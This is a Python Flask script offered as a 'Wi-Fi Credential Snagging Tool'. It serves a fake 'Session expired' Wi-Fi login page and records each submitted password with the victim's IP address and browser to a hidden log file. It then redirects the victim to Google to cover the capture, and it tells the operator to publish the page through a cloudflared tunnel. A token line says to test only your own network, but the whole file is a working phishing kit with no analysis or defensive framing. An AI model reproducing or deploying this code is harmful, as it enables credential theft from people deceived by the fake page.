import os
import time
import pyfiglet
import webbrowser
from flask import Flask, request, render_template_string, redirect
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# === Setup ===
app = Flask(__name__)
console = Console()
LOGS = ".wifi_logs"
LOG_FILE = os.path.join(LOGS, "passwords.log")
if not os.path.exists(LOGS): os.makedirs(LOGS)

# === Channel Open (Termux-compatible) ===
os.system("termux-open-url https://youtube.com/@rocky-ha4ker")
time.sleep(3)

# === Banner ===
def banner(text, color="green"):
    b = pyfiglet.figlet_format(text, font="slant")
    console.print(Align.center(f"[bold {color}]{b}[/bold {color}]"))

# === Intro Screen ===
def intro():
    os.system("clear")
    banner("A.R_WIFI", "cyan")
    console.print("\033[1;31m" + "         🔥 BY TEAM ROCKY 🔥\n")
    console.print(Panel.fit(
        "[cyan]Wi-Fi Credential Snagging Tool[/cyan]\n"
        "Made by: [bold green]Rocky & Arbab[/bold green]\n"
        "[yellow]Note:[/yellow] Use only for testing your own network.",
        title="WELCOME", border_style="blue"))

# === Thank You Screen ===
def open_channel_thank():
    console.print(Panel.fit(
        "[green]✅ Thanks for supporting us![/green]\n[yellow]Starting the tool now...[/yellow]",
        border_style="magenta"))
    time.sleep(2)

# === Tool Menu ===
def tool_menu():
    console.print("\n[bold cyan]1. Start Tool[/bold cyan]")
    console.print("[bold red]2. Exit[/bold red]\n")
    choice = input("➤ Choose: ")
    if choice == "1":
        start_server()
    else:
        console.print("[bold red]❌ Exiting...[/bold red]")
        exit()

# === HTML Page ===
login_html = '''
<!DOCTYPE html><html><head><title>Wi-Fi Auth</title>
<style>body{background:#000428;color:white;text-align:center;padding-top:100px;font-family:sans-serif}
input,button{padding:15px;margin:10px;width:80%;max-width:300px}
.container{background:#111;padding:30px;border-radius:10px;display:inline-block;box-shadow:0 0 15px lime}
</style></head>
<body><div class="container">
<h2>Wi-Fi Authentication</h2>
<p>Session expired. Please enter your Wi-Fi password to reconnect.</p>
<form method="POST" action="/login">
<input type="password" name="password" placeholder="Wi-Fi Password" required autofocus><br>
<button type="submit">Reconnect</button></form></div></body></html>
'''

# === Logging Passwords ===
def log_password(pwd, ip, agent):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{now}] [IP: {ip}] [Agent: {agent}] Password: {pwd}"
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n" + "-"*60 + "\n")
    console.print(f"[bold green][+][/bold green] {line}")

# === Flask Routes ===
@app.route('/')
def index():
    return render_template_string(login_html)

@app.route('/login', methods=['POST'])
def login():
    pwd = request.form.get('password')
    log_password(pwd, request.remote_addr, request.headers.get('User-Agent'))
    return redirect("https://google.com")  # Redirect after capture

# === Start Server ===
def start_server():
    intro()
    console.print("[bold green]✔ Running server on http://127.0.0.1:8080[/bold green]")
    console.print("[bold yellow]📢 Share public link using:\n[bold blue]cloudflared tunnel --url http://127.0.0.1:8080[/bold blue][/bold yellow]\n")
    app.run(host="127.0.0.1", port=8080)

# === Main ===
if __name__ == "__main__":
    intro()
    open_channel_thank()
    tool_menu()